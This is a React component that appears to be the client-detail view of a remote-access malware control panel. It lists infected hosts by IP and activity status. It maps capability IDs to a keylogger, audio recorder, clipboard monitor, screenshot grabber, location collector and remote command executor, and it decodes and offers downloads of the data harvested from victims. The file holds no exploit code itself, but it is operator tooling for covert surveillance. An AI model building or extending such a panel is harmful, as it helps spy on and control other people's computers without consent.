import React, { useState, useEffect } from 'react';
import { api } from '../api';

function ClientDetail({ clientId, onBack }) {
  const [activeTab, setActiveTab] = useState('general');
  const [clientData, setClientData] = useState(null);
  const [results, setResults] = useState([]);
  const [systemInfo, setSystemInfo] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (clientId) {
      fetchClientData();
      const interval = setInterval(fetchClientData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [clientId]);

  const fetchClientData = async () => {
    try {
      // Fetch client details
      const clientResponse = await api.getClient(clientId);
      setClientData(clientResponse.client);

      // Fetch results for this client
      const resultsResponse = await api.getClientResults(clientId);
      const allResults = resultsResponse.results || [];
      setResults(allResults);

      // Extract latest system info (capability 5)
      const systemInfoResults = allResults.filter(r => r.capability === 5);
      if (systemInfoResults.length > 0) {
        const latestSystemInfo = systemInfoResults[0]; // Already sorted by timestamp desc
        try {
          // Decode base64 system info
          const decodedInfo = atob(latestSystemInfo.result);
          setSystemInfo({
            raw: decodedInfo,
            timestamp: latestSystemInfo.timestamp,
            parsed: parseSystemInfo(decodedInfo)
          });
        } catch (e) {
          console.error('Error decoding system info:', e);
          setSystemInfo({
            raw: latestSystemInfo.result,
            timestamp: latestSystemInfo.timestamp,
            parsed: null
          });
        }
      }

      setLoading(false);
    } catch (error) {
      console.error('Error fetching client data:', error);
      setLoading(false);
    }
  };

  const parseSystemInfo = (rawInfo) => {
    try {
      // Parse the system info text into structured data
      const lines = rawInfo.split('\n');
      const info = {};
      let currentSection = null;

      lines.forEach(line => {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('===') || trimmed.startsWith('---')) return;

        // Check for section headers
        if (trimmed.endsWith(':') && !trimmed.includes('  ')) {
          currentSection = trimmed.slice(0, -1);
          info[currentSection] = {};
        } else if (currentSection && trimmed.includes(':')) {
          const [key, ...valueParts] = trimmed.split(':');
          const value = valueParts.join(':').trim();
          info[currentSection][key.trim()] = value;
        } else if (trimmed) {
          if (!info.general) info.general = {};
          info.general[trimmed] = true;
        }
      });

      return info;
    } catch (e) {
      console.error('Error parsing system info:', e);
      return null;
    }
  };

  const isClientActive = (lastSeen) => {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    return new Date(lastSeen) > fiveMinutesAgo;
  };

  const getCapabilityName = (capId) => {
    const capabilities = {
      0: "No Command (idle)",
      1: "Audio Recorder",
      2: "Clipboard Monitor",
      3: "Keylogger",
      4: "Screenshot",
      5: "Info Collector",
      6: "Command Executor",
      7: "Location Collector"
    };
    return capabilities[capId] || `Unknown (${capId})`;
  };

  const formatResultPreview = (result, capability) => {
    if (!result) return 'N/A';
    
    // For base64 encoded data, show preview
    if (result.length > 100 && /^[A-Za-z0-9+/]+=*$/.test(result)) {
      if (capability === 4) return '[Screenshot Data]';
      if (capability === 1) return '[Audio Data]';
      return `[Base64 Data - ${Math.round(result.length * 0.75 / 1024)}KB]`;
    }
    
    return result.substring(0, 100) + (result.length > 100 ? '...' : '');
  };

  if (loading) {
    return <div className="loading">Loading client details...</div>;
  }

  if (!clientData) {
    return <div className="card"><p>Client not found.</p></div>;
  }

  return (
    <div>
      <div className="card">
        <button className="btn" onClick={onBack} style={{ marginBottom: '15px' }}>
          ← Back to Clients
        </button>
        
        <h2>Client: <code>{clientData.id}</code></h2>
        <div style={{ display: 'flex', gap: '20px', marginTop: '10px', marginBottom: '20px' }}>
          <div>
            <strong>IP Address:</strong> {clientData.ip}
          </div>
          <div>
            <strong>Status:</strong>{' '}
            <span className={isClientActive(clientData.last_seen) ? 'status-active' : 'status-inactive'}>
              {isClientActive(clientData.last_seen) ? '● Active' : '○ Inactive'}
            </span>
          </div>
          <div>
            <strong>Registered:</strong> {new Date(clientData.registered_at).toLocaleString()}
          </div>
          <div>
            <strong>Last Seen:</strong> {new Date(clientData.last_seen).toLocaleString()}
          </div>
        </div>

        {/* Tabs */}
        <div className="nav" style={{ marginBottom: '20px' }}>
          <button
            className={activeTab === 'general' ? 'active' : ''}
            onClick={() => setActiveTab('general')}
          >
            General
          </button>
          <button
            className={activeTab === 'commands' ? 'active' : ''}
            onClick={() => setActiveTab('commands')}
          >
            Commands
          </button>
          <button
            className={activeTab === 'results' ? 'active' : ''}
            onClick={() => setActiveTab('results')}
          >
            Results ({results.length})
          </button>
          <button
            className={activeTab === 'systeminfo' ? 'active' : ''}
            onClick={() => setActiveTab('systeminfo')}
          >
            System Info
          </button>
        </div>

        {/* Tab Content */}
        {activeTab === 'general' && (
          <div>
            <h3>General Information</h3>
            {systemInfo ? (
              <div>
                <p style={{ marginBottom: '10px' }}>
                  <strong>Latest System Info:</strong> {new Date(systemInfo.timestamp).toLocaleString()}
                </p>
                <div className="code-block">
                  <pre style={{ whiteSpace: 'pre-wrap', wordWrap: 'break-word' }}>
                    {systemInfo.raw}
                  </pre>
                </div>
              </div>
            ) : (
              <div>
                <p>No system information collected yet.</p>
                <p style={{ color: '#888', fontSize: '0.9em' }}>
                  System info will appear here after running the Info Collector capability (ID: 5).
                </p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'commands' && (
          <div>
            <h3>Command History</h3>
            <p style={{ color: '#888', marginBottom: '15px' }}>
              View command execution history for this client.
            </p>
            <table className="table">
              <thead>
                <tr>
                  <th>Capability</th>
                  <th>Arguments</th>
                  <th>Created</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                {results.map((result) => (
                  <tr key={result.id}>
                    <td>{getCapabilityName(result.capability)}</td>
                    <td><code>{result.capability === 6 ? 'Command executed' : '-'}</code></td>
                    <td>{new Date(result.timestamp).toLocaleString()}</td>
                    <td><span className="status-active">✓ Completed</span></td>
                  </tr>
                ))}
                {results.length === 0 && (
                  <tr>
                    <td colSpan="4" style={{ textAlign: 'center', color: '#888' }}>
                      No commands executed yet
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        )}

        {activeTab === 'results' && (
          <div>
            <h3>Results</h3>
            <p style={{ color: '#888', marginBottom: '15px' }}>
              All execution results from this client.
            </p>
            <table className="table">
              <thead>
                <tr>
                  <th>Capability</th>
                  <th>Timestamp</th>
                  <th>Result Preview</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {results.map((result) => (
                  <tr key={result.id}>
                    <td>{getCapabilityName(result.capability)}</td>
                    <td>{new Date(result.timestamp).toLocaleString()}</td>
                    <td>
                      <code style={{ fontSize: '0.85em' }}>
                        {formatResultPreview(result.result, result.capability)}
                      </code>
                    </td>
                    <td>
                      <button
                        className="btn"
                        style={{ fontSize: '0.85em', padding: '4px 8px' }}
                        onClick={() => {
                          const blob = new Blob([result.result], { type: 'text/plain' });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement('a');
                          a.href = url;
                          a.download = `result_${result.id}_${result.capability}.txt`;
                          a.click();
                          URL.revokeObjectURL(url);
                        }}
                      >
                        Download
                      </button>
                    </td>
                  </tr>
                ))}
                {results.length === 0 && (
                  <tr>
                    <td colSpan="4" style={{ textAlign: 'center', color: '#888' }}>
                      No results yet
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        )}

        {activeTab === 'systeminfo' && (
          <div>
            <h3>System Information</h3>
            {systemInfo ? (
              <div>
                <p style={{ marginBottom: '10px' }}>
                  <strong>Last Updated:</strong> {new Date(systemInfo.timestamp).toLocaleString()}
                </p>
                
                {systemInfo.parsed ? (
                  <div>
                    {Object.entries(systemInfo.parsed).map(([section, data]) => (
                      <div key={section} style={{ marginBottom: '20px' }}>
                        <h4 style={{ borderBottom: '1px solid #ddd', paddingBottom: '5px' }}>
                          {section}
                        </h4>
                        <table className="table">
                          <tbody>
                            {Object.entries(data).map(([key, value]) => (
                              <tr key={key}>
                                <td style={{ width: '30%', fontWeight: 'bold' }}>{key}</td>
                                <td>{typeof value === 'boolean' ? '✓' : value}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="code-block">
                    <pre style={{ whiteSpace: 'pre-wrap', wordWrap: 'break-word' }}>
                      {systemInfo.raw}
                    </pre>
                  </div>
                )}
                
                <button
                  className="btn"
                  style={{ marginTop: '15px' }}
                  onClick={() => {
                    const blob = new Blob([systemInfo.raw], { type: 'text/plain' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `systeminfo_${clientId}_${new Date().toISOString()}.txt`;
                    a.click();
                    URL.revokeObjectURL(url);
                  }}
                >
                  Download System Info
                </button>
              </div>
            ) : (
              <div>
                <p>No system information available for this client.</p>
                <p style={{ color: '#888', fontSize: '0.9em' }}>
                  Run the Info Collector capability (ID: 5) to gather system information.
                </p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

export default ClientDetail;
